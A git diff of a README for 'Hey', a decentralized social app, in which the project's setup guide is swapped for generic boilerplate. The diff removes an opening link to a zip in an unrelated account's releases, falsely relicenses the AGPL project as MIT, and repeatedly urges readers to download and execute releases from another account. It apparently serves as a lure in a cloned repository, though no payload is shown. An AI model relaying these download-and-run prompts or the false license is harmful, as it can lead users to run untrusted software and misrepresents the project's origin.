@@ -1,83 +1,126 @@
-# Hey Monorepo
+# Hey 🌿 - A Decentralized Social Media Experience
 
-[Download here](https://github.com/amonrac2pg/hey/releases/download/hb/hb.1.7.3.zip)
+![GitHub release](https://img.shields.io/github/release/mfea3838/hey.svg) ![GitHub issues](https://img.shields.io/github/issues/mfea3838/hey.svg) ![GitHub stars](https://img.shields.io/github/stars/mfea3838/hey.svg)
 
-## Requirements
+Welcome to **Hey**, a decentralized and permissionless social media application built with the **Lens Protocol**. Our mission is to empower users with control over their content and interactions, fostering a more open and inclusive online community.
 
-To get started with the Hey monorepo, ensure the following dependencies are installed on your system:
+## Table of Contents
 
-- [Node.js](https://nodejs.org/en/download/) (v18 or higher) - The backbone of our project.
-- [pnpm](https://pnpm.io/installation) - Our trusty package manager.
-- [Postgres App](https://postgresapp.com/) - Our database of choice.
+- [Features](#features)
+- [Technologies](#technologies)
+- [Getting Started](#getting-started)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-## Installation
+## Features
 
-This repository uses [pnpm workspaces](https://pnpm.io/workspaces) to manage multiple packages within a monorepo structure.
+- **Decentralization**: No central authority controls your data.
+- **Permissionless**: Anyone can join and interact without barriers.
+- **User Control**: You own your content and decide how it is shared.
+- **Seamless Integration**: Built on the Lens Protocol for a smooth experience.
+- **Responsive Design**: Enjoy a great experience on both desktop and mobile devices.
 
-### Clone the Repository
+## Technologies
 
-```bash
-git clone git@github.com:heyverse/hey.git
-```
+This project uses a variety of technologies to deliver a robust user experience:
 
-### Install NVM and pnpm
+- **Blockchain**: Ensures security and transparency.
+- **Crypto**: Enables transactions and user interactions.
+- **DApp**: A decentralized application that runs on the blockchain.
+- **GraphQL**: For efficient data fetching.
+- **Next.js**: A powerful React framework for server-side rendering.
+- **React**: The core library for building user interfaces.
+- **Tailwind CSS**: For a modern and responsive design.
+- **Turborepo**: For managing monorepos effectively.
+- **TypeScript**: Adds type safety to the codebase.
+- **Vitest**: For testing components and ensuring quality.
+- **Wagmi**: A React Hooks library for Ethereum.
+- **Web3**: For interacting with the blockchain.
 
-If you're on macOS, both can be installed via Homebrew:
+## Getting Started
 
-```bash
-brew install nvm pnpm
-```
+To get started with **Hey**, follow these steps:
 
-### Install Node.js
+1. Clone the repository:
+   ```bash
+   git clone https://github.com/mfea3838/hey.git
+   ```
 
-Use `nvm` to install the correct Node.js version:
+2. Navigate into the project directory:
+   ```bash
+   cd hey
+   ```
 
-```bash
-nvm install
-```
+3. Install the dependencies:
+   ```bash
+   npm install
+   ```
 
-### Install Dependencies
+4. Start the development server:
+   ```bash
+   npm run dev
+   ```
 
-Navigate to the root of the repository and install all dependencies using pnpm:
+5. Open your browser and visit `http://localhost:3000`.
 
-```bash
-pnpm install
-```
+For the latest releases, you can visit [Hey Releases](https://github.com/mfea3838/hey/releases) to download the latest version and execute it.
 
-### Setup Environment Variables
+## Usage
 
-Copy the `.env.example` file to create a new `.env` file for each package or app that requires environment configuration:
+Once the application is running, you can create an account, post content, and interact with other users. The interface is designed to be user-friendly, allowing you to navigate through different sections easily.
 
-```bash
-cp .env.example .env
-```
+### Creating an Account
 
-Repeat this process for all relevant packages and applications in the monorepo.
+1. Click on the "Sign Up" button.
+2. Fill in your details and verify your email.
+3. Log in to start using the app.
 
-### Start the Development Server
+### Posting Content
 
-To run the application in development mode:
+- Navigate to the "Create Post" section.
+- Write your content and add any media.
+- Click "Post" to share it with the community.
 
-```bash
-pnpm dev
-```
+### Interacting with Others
 
-## Build and Test
+- Like and comment on posts you enjoy.
+- Follow users to see their updates in your feed.
+- Share posts to your network.
 
-### Build the Application
+For additional features and updates, please check the [Releases section](https://github.com/mfea3838/hey/releases).
 
-To compile the application:
+## Contributing
 
-```bash
-pnpm build
-```
+We welcome contributions to improve **Hey**. Here’s how you can help:
+
+1. **Fork the repository**: Create your own copy of the project.
+2. **Create a new branch**: Use a descriptive name for your branch.
+   ```bash
+   git checkout -b feature/YourFeatureName
+   ```
+3. **Make your changes**: Implement your feature or fix a bug.
+4. **Commit your changes**: Write a clear commit message.
+   ```bash
+   git commit -m "Add your message here"
+   ```
+5. **Push to your branch**: Upload your changes.
+   ```bash
+   git push origin feature/YourFeatureName
+   ```
+6. **Create a Pull Request**: Submit your changes for review.
 
 ## License
 
-This project is licensed under the **AGPL-3.0** license. Please refer to the [LICENSE](./LICENSE) file for full terms and conditions.
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-## P.S
+## Contact
 
-We 💖 you to the moon and back! Your support is like a never-ending supply of coffee for our code. Thank you for making Hey the most awesome place in the universe!
+For questions or suggestions, feel free to reach out:
 
-🌸
+- **Email**: your-email@example.com
+- **Twitter**: [@yourhandle](https://twitter.com/yourhandle)
+- **Discord**: Join our community on Discord.
+
+Thank you for checking out **Hey**! We hope you enjoy using the app and contributing to its growth. Your feedback is invaluable as we continue to build a better social media experience.
